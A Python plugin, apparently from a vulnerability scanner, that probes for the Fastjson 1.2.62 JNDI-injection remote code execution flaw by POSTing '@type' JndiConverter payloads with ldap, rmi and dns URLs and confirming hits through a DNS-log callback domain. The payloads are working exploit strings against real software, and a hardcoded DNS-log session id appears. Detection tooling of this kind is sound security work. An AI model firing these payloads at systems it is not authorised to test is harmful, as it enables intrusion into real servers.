#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

rce_1_2_62_payloads = [
    {'data': '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://DNSDOMAIN/aixn"}"'},
    {'data': '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://DNSDOMAIN/pozi"}"'},
    {'data': '{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"dns://DNSDOMAIN/lsai"}"'},
]

def rce_1_2_62_scan(clients):
    ''' 2月19日，NVD发布的Jackson-databind JNDI注入漏洞（CVE-2020-8840）
        在jackson-databind中的反序列化gadget也同样影响了fastjson
        在开启了autoType功能的情况下（autoType功能默认关闭）
        该漏洞影响最新的fastjson 1.2.62版本
        攻击者利用该漏洞可实现在目标机器上的远程代码执行
    '''
    client = clients.get('reqClient')
    sessid = '5f3b7891154790b67cfa29ba2041839e'
    
    vul_info = {
        'app_name': 'Fastjson',
        'vul_type': 'unSerialize',
        'vul_id': 'fastjson-1.2.62_rce',
    }
    
    headers = {
        'Content-Type': 'application/json'
    }

    for payload in rce_1_2_62_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
        
        data = payload['data'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'post',
            '',
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
